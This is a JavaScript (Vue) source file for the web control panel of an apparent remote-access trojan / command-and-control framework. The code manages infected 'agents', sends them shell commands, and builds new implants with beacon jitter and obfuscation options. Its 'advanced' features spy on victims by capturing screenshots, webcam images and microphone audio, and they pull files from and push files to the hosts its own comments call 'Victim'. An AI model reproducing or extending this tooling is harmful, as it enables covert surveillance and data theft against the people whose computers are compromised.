const { createApp, ref, onMounted, computed, nextTick } = Vue;

createApp({
    setup() {
        // State
        const currentView = ref('dashboard');
        const sessions = ref([]);
        const connectionStatus = ref('disconnected');
        const selectedAgent = ref(null);
        const commandInput = ref('');
        const isSendingCommand = ref(false);
        const agentConsoleLogs = ref({}); // Map: session_id -> array of logs
        const recentLogs = ref([]);
        const commandHistory = ref([]);

        const currentHistoryAgentId = ref(null); // Filter history by agent
        const username = ref(localStorage.getItem('username') || '');
        
        // Builder State
        const builderConfig = ref({
            server_url: window.location.origin,
            format: 'source',
            beacon_interval_min: 5,
            beacon_interval_max: 10,
            jitter: 0.2,
            obfuscation: 'none'
        });
        const isGenerating = ref(false);
        
        // Refs
        const terminalOutput = ref(null);
        const commandInputRef = ref(null);

        // Advanced Features State
        const showAdvancedModal = ref(false);
        const advancedAgent = ref(null);
        const advancedTab = ref('surveillance');
        const isExecutingAdvanced = ref(false);
        const lastScreenshot = ref(null);
        const lastCamImage = ref(null);
        const lastAudio = ref(null);
        const micDuration = ref(5);
        const uploadPath = ref('');
        const downloadPath = ref('C:\\Users\\Public\\secret.txt');
        const fileInput = ref(null);

        // Auth Helper
        const logout = () => {
            localStorage.removeItem('auth_token');
            localStorage.removeItem('username');
            window.location.href = '/login.html';
        };

        const authenticatedFetch = async (url, options = {}) => {
            const token = localStorage.getItem('auth_token');
            if (!token) {
                window.location.href = '/login.html';
                return null;
            }

            if (!options.headers) options.headers = {};
            if (options.headers instanceof Headers) {
                options.headers.append('Authorization', `Bearer ${token}`);
            } else {
                options.headers['Authorization'] = `Bearer ${token}`;
            }

            try {
                const response = await fetch(url, options);
                if (response.status === 401) {
                    logout();
                    return null;
                }
                return response;
            } catch (e) {
                throw e;
            }
        };

        // Computed
        const activeAgentsCount = computed(() => {
            return sessions.value.filter(s => s.status === 'active').length;
        });

        const viewTitle = computed(() => {
            switch(currentView.value) {
                case 'dashboard': return 'Dashboard Overview';
                case 'agents': return 'Agent Management';
                case 'agent_interaction': return 'Console Interaction';
                case 'commands': return 'Command History';
                case 'builder': return 'Agent Builder';
                default: return 'Dashboard';
            }
        });

        // Methods
        const formatTime = (timestamp) => {
            if (!timestamp) return '-';
            const date = new Date(timestamp * 1000);
            if (isNaN(date.getTime())) {
                 const isoDate = new Date(timestamp);
                 if (!isNaN(isoDate.getTime())) return isoDate.toLocaleTimeString();
                 return timestamp;
            }
            return date.toLocaleTimeString();
        };

        const addLog = (message, type = 'info') => {
            const time = new Date().toLocaleTimeString();
            let typeClass = 'text-gray-400';
            if (type === 'error') typeClass = 'text-red-400';
            if (type === 'success') typeClass = 'text-green-400';
            
            recentLogs.value.unshift({ id: Date.now(), time, message, typeClass });
            if (recentLogs.value.length > 50) recentLogs.value.pop();
        };

        const addConsoleLog = (sessionId, content, type = 'output') => {
            if (!agentConsoleLogs.value[sessionId]) {
                agentConsoleLogs.value[sessionId] = [];
            }
            agentConsoleLogs.value[sessionId].push({
                id: Date.now() + Math.random(),
                content,
                type
            });
            
            nextTick(() => {
                if (terminalOutput.value) {
                    terminalOutput.value.scrollTop = terminalOutput.value.scrollHeight;
                }
            });
        };

        const fetchSessions = async () => {
            try {
                const response = await authenticatedFetch('/api/sessions');
                if (response && response.ok) {
                    const data = await response.json();
                    sessions.value = data.sessions || [];
                    connectionStatus.value = 'connected';
                    
                    // Update advancedAgent if selected to handle session rotation
                    if (advancedAgent.value) {
                        // Try to find the same session first
                        let updated = sessions.value.find(s => s.id === advancedAgent.value.id);
                        
                        // If not found or inactive, look for an active session with same agent_id
                        if (!updated || updated.status !== 'active') {
                            const activeSession = sessions.value.find(s => 
                                s.agent_id === advancedAgent.value.agent_id && 
                                s.status === 'active'
                            );
                            if (activeSession) {
                                console.log(`Session rotation detected: ${advancedAgent.value.id} -> ${activeSession.id}`);
                                advancedAgent.value = activeSession;
                            } else if (updated) {
                                // Just update status/info if no active replacement found
                                advancedAgent.value = updated;
                            }
                        } else {
                            // Update current session info (last_activity, etc)
                            advancedAgent.value = updated;
                        }
                    }
                } else {
                    connectionStatus.value = 'disconnected';
                }
            } catch (error) {
                console.error('Fetch sessions error:', error);
                connectionStatus.value = 'disconnected';
            }
        };

        const fetchCommands = async () => {
            try {
                let url = '/api/commands?limit=50';
                if (currentHistoryAgentId.value) {
                    url += `&agent_id=${currentHistoryAgentId.value}`;
                }
                const response = await authenticatedFetch(url);
                if (response && response.ok) {
                    const data = await response.json();
                    const commands = (data.commands || []).map(cmd => {
                        try {
                            if (cmd.params && typeof cmd.params === 'string') {
                                cmd.params = JSON.parse(cmd.params);
                            }
                            if (cmd.result && typeof cmd.result === 'string') {
                                try {
                                    const parsed = JSON.parse(cmd.result);
                                    if (parsed.stdout !== undefined) {
                                        cmd.result = parsed.stdout || parsed.stderr || (parsed.status === 'success' ? 'Success' : JSON.stringify(parsed));
                                        cmd.full_result = parsed;
                                    } else {
                                        cmd.result = parsed;
                                    }
                                } catch (e) {
                                    // Not JSON
                                }
                            }
                        } catch (e) {
                            console.warn('Failed to parse command data', e);
                        }
                        return cmd;
                    });
                    commandHistory.value = commands;
                }
            } catch (error) {
                console.error('Fetch commands error:', error);
            }
        };

        const showAgentHistory = (agentId) => {
            currentHistoryAgentId.value = agentId;
            currentView.value = 'commands';
            fetchCommands();
        };

        const clearHistoryFilter = () => {
            currentHistoryAgentId.value = null;
            fetchCommands();
        };

        const selectAgent = (agent) => {
            selectedAgent.value = agent;
            currentView.value = 'agent_interaction';
            nextTick(() => {
                if (commandInputRef.value) commandInputRef.value.focus();
            });
        };

        const quickCommand = (cmd) => {
            commandInput.value = cmd;
            sendCommand();
        };

        const sendCommand = async () => {
            const cmd = commandInput.value.trim();
            if (!cmd || !selectedAgent.value) return;

            isSendingCommand.value = true;
            const sessionId = selectedAgent.value.id;
            
            addConsoleLog(sessionId, cmd, 'command');
            commandInput.value = '';

            try {
                let commandName = cmd;
                let params = {};
                
                const spaceIndex = cmd.indexOf(' ');
                if (spaceIndex !== -1) {
                    const firstWord = cmd.substring(0, spaceIndex);
                    const rest = cmd.substring(spaceIndex + 1).trim();
                    
                    if (rest.startsWith('{') && rest.endsWith('}')) {
                        try {
                            const jsonStr = rest.replace(/'/g, '"'); 
                            params = JSON.parse(jsonStr);
                            commandName = firstWord;
                        } catch (e) {
                            console.warn("Failed to parse params JSON", e);
                        }
                    }
                }

                const payload = {
                    session_id: sessionId,
                    command: commandName,
                    params: params,
                    operator: 'web_admin'
                };

                const response = await authenticatedFetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (!response) return;

                const data = await response.json();

                if (data.status === 'success' || data.status === 'scheduled') {
                    const commandId = data.command_id || data.id;
                    if (!commandId) {
                        addConsoleLog(sessionId, "Error: No command ID received from server", 'error');
                        return;
                    }
                    addLog(`Command sent to ${selectedAgent.value.hostname}: ${commandName}`, 'info');
                    pollCommandResult(commandId, sessionId);
                } else {
                    addConsoleLog(sessionId, `Error: ${data.error || 'Unknown error'}`, 'error');
                }

            } catch (error) {
                addConsoleLog(sessionId, `Network Error: ${error.message}`, 'error');
            } finally {
                isSendingCommand.value = false;
                nextTick(() => {
                    if (commandInputRef.value) commandInputRef.value.focus();
                });
            }
        };

        const pollCommandResult = async (commandId, sessionId) => {
            let retries = 0;
            const maxRetries = 60;
            
            const poll = async () => {
                if (retries >= maxRetries) {
                    addConsoleLog(sessionId, `Timeout waiting for result (ID: ${commandId})`, 'error');
                    return;
                }

                try {
                    const response = await authenticatedFetch(`/api/command/${commandId}`);
                    if (response && response.ok) {
                        const data = await response.json();
                        if (data.status === 'completed') {
                            const result = data.result;
                            
                            if (result.stdout) addConsoleLog(sessionId, result.stdout, 'output');
                            if (result.stderr) addConsoleLog(sessionId, result.stderr, 'error');
                            if (result.error) addConsoleLog(sessionId, result.error, 'error');
                            
                            if (result.data) {
                                addConsoleLog(sessionId, `[+] File received (${result.size} bytes). Downloading...`, 'success');
                                downloadFile(result.data, result.path || 'download.bin', data.command === 'zip');
                            }

                            if (!result.stdout && !result.stderr && !result.error && !result.data) {
                                addConsoleLog(sessionId, "(Command completed with no output)", 'info');
                            }
                            
                            addLog(`Command finished: ${data.command}`, 'success');
                            return;
                        }
                    }
                } catch (e) {
                    console.error("Poll error", e);
                }

                retries++;
                setTimeout(poll, 1000);
            };

            poll();
        };

        const downloadFile = (base64Data, filename, isZip) => {
            try {
                const byteCharacters = atob(base64Data);
                const byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray], { type: isZip ? 'application/zip' : 'application/octet-stream' });
                
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                const name = filename.split(/[\\/]/).pop() || (isZip ? 'download.zip' : 'download.bin');
                a.download = name;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                window.URL.revokeObjectURL(url);
            } catch (e) {
                console.error("Download error", e);
            }
        };

        const generateAgent = async () => {
            isGenerating.value = true;
            try {
                const payload = {
                    format: builderConfig.value.format,
                    obfuscation: builderConfig.value.obfuscation,
                    config: {
                        server_url: builderConfig.value.server_url,
                        beacon_interval_min: builderConfig.value.beacon_interval_min,
                        beacon_interval_max: builderConfig.value.beacon_interval_max,
                        jitter: builderConfig.value.jitter
                    }
                };

                const response = await authenticatedFetch('/api/builder/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response && response.ok) {
                    const data = await response.json();
                    
                    if (data.status === 'success' && data.content_b64) {
                        // Decode Base64 to binary
                        const binaryString = atob(data.content_b64);
                        const bytes = new Uint8Array(binaryString.length);
                        for (let i = 0; i < binaryString.length; i++) {
                            bytes[i] = binaryString.charCodeAt(i);
                        }
                        
                        // Determine MIME type
                        let mimeType = 'application/octet-stream';
                        if (data.filename.endsWith('.zip')) mimeType = 'application/zip';
                        else if (data.filename.endsWith('.exe')) mimeType = 'application/vnd.microsoft.portable-executable';
                        
                        const blob = new Blob([bytes], { type: mimeType });
                        const url = window.URL.createObjectURL(blob);
                        
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = data.filename;
                        document.body.appendChild(a);
                        a.click();
                        
                        window.URL.revokeObjectURL(url);
                        document.body.removeChild(a);
                        addLog("Agent generated successfully", "success");
                    } else {
                        addLog('Generation failed: ' + (data.error || 'Unknown error'), 'error');
                    }
                } else if (response) {
                    const error = await response.json();
                    addLog('Generation failed: ' + (error.error || 'Unknown error'), 'error');
                }
            } catch (e) {
                console.error('Builder error:', e);
                addLog('Generation failed: Network error', 'error');
            } finally {
                isGenerating.value = false;
            }
        };

        // Advanced Functions
        const showAdvanced = (agent) => {
            advancedAgent.value = agent;
            showAdvancedModal.value = true;
            advancedTab.value = 'surveillance';
            // Reset states
            lastScreenshot.value = null;
            lastCamImage.value = null;
            lastAudio.value = null;
        };

        const closeAdvanced = () => {
            showAdvancedModal.value = false;
            advancedAgent.value = null;
        };

        const sendAdvancedCommand = async (command, params = {}) => {
            if (!advancedAgent.value) return;
            isExecutingAdvanced.value = true;
            
            // Mapping for UI commands to Agent commands
            let agentCommand = command;
            // "download_file" in UI means "Download from Victim" -> Agent executes "upload_file" (to server/me)
            if (command === 'download_file') {
                agentCommand = 'upload_file';
                // Ensure path is correctly passed as params.path
                if (params && params.path) {
                    // params is already {path: ...} from the button click
                }
            }
            
            try {
                const response = await authenticatedFetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        session_id: advancedAgent.value.id,
                        command: agentCommand,
                        params: params
                    })
                });

                if (response.ok) {
                    const data = await response.json();
                    addLog(`Advanced command '${command}' scheduled`, 'info');
                    
                    // Calculate dynamic timeout
                    let timeout = 20;
                    if (command === 'mic_record' && params.duration) {
                        timeout = parseInt(params.duration) + 15; // +15s buffer
                    }
                    
                    pollForAdvancedResult(data.command_id, command, timeout);
                } else {
                    addLog('Failed to schedule command', 'error');
                    isExecutingAdvanced.value = false;
                }
            } catch (e) {
                console.error("Advanced command error", e);
                isExecutingAdvanced.value = false;
            }
        };

        const pollForAdvancedResult = async (commandId, commandType, timeoutSec = 20) => {
            let retries = 0;
            const maxRetries = timeoutSec;

            const check = async () => {
                if (retries >= maxRetries) {
                    addLog(`Timeout waiting for ${commandType}`, 'error');
                    isExecutingAdvanced.value = false;
                    return;
                }

                try {
                    const response = await authenticatedFetch(`/api/command/${commandId}`);
                    if (response.ok) {
                        const data = await response.json();
                        if (data.status === 'completed') {
                            handleAdvancedResult(data.result, commandType);
                            isExecutingAdvanced.value = false;
                            return;
                        }
                    }
                } catch (e) { console.error(e); }

                retries++;
                setTimeout(check, 1000);
            };
            check();
        };

        const handleAdvancedResult = (result, type) => {
            // Parse if string
            if (typeof result === 'string') {
                try { result = JSON.parse(result); } catch (e) {}
            }

            if (result.status === 'error') {
                addLog(`Command failed: ${result.error}`, 'error');
                return;
            }

            if (type === 'screenshot') {
                if (result.b64) lastScreenshot.value = `data:image/png;base64,${result.b64}`;
            } else if (type === 'cam_snapshot') {
                if (result.b64) lastCamImage.value = `data:image/jpeg;base64,${result.b64}`;
            } else if (type === 'mic_record') {
                if (result.b64) lastAudio.value = `data:audio/wav;base64,${result.b64}`;
            } else if (type === 'upload_file') {
                 // "Download from Victim" (Agent executed upload_file -> returns data)
                 if (result.data) {
                     // result.data is base64
                     downloadFile(result.data, result.path ? result.path.split(/[/\\]/).pop() : 'downloaded_file', false);
                     addLog('File downloaded from agent', 'success');
                 } else {
                     addLog('File upload command executed but no data returned', 'warning');
                 }
            } else if (type === 'download_url') {
                // "Upload to Victim" (download_url executed on agent)
                addLog('File downloaded successfully on agent', 'success');
            }
        };

        const handleFileUploadSelect = (event) => {
            const file = event.target.files[0];
            if (file) {
                // Pre-fill with filename, user can add path
                uploadPath.value = file.name;
            }
        };

        const uploadFile = async () => {
            const file = fileInput.value.files[0];
            if (!file || !uploadPath.value || !advancedAgent.value) return;

            const formData = new FormData();
            formData.append('file', file);

            try {
                // 1. Upload to server first
                // Use raw fetch for FormData
                const token = localStorage.getItem('auth_token');
                const rawResp = await fetch('/api/files/upload', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${token}`
                    },
                    body: formData
                });

                if (rawResp.ok) {
                    const uploadData = await rawResp.json();
                    // Send relative URL to agent; Agent will prepend its server_url
                    const fileUrl = uploadData.url; 
                    
                    // 2. Tell agent to download it
                    await sendAdvancedCommand('download_url', {
                        url: fileUrl,
                        destination: uploadPath.value
                    });
                } else {
                    addLog('Server upload failed', 'error');
                    isExecutingAdvanced.value = false;
                }
            } catch (e) {
                console.error("Upload error", e);
                addLog('Upload failed: ' + e.message, 'error');
                isExecutingAdvanced.value = false;
            }
        };

        // Lifecycle
        onMounted(() => {
            fetchSessions();
            fetchCommands();
            setInterval(fetchSessions, 2000);
            setInterval(fetchCommands, 5000);
        });

        return {
            currentView,
            sessions,
            connectionStatus,
            selectedAgent,
            commandInput,
            isSendingCommand,
            agentConsoleLogs,
            recentLogs,
            commandHistory,
            activeAgentsCount,
            viewTitle,
            selectAgent,
            sendCommand,
            quickCommand,
            terminalOutput,
            commandInputRef,
            formatTime,
            username,
            logout,
            currentHistoryAgentId,
            showAgentHistory,
            clearHistoryFilter,
            builderConfig,
            isGenerating,
            generateAgent,
            
            // Advanced
            showAdvanced,
            closeAdvanced,
            sendAdvancedCommand,
            uploadFile,
            handleFileUploadSelect,
            showAdvancedModal,
            advancedAgent,
            advancedTab,
            isExecutingAdvanced,
            lastScreenshot,
            lastCamImage,
            lastAudio,
            micDuration,
            uploadPath,
            downloadPath,
            fileInput
        };
    }
}).mount('#app');
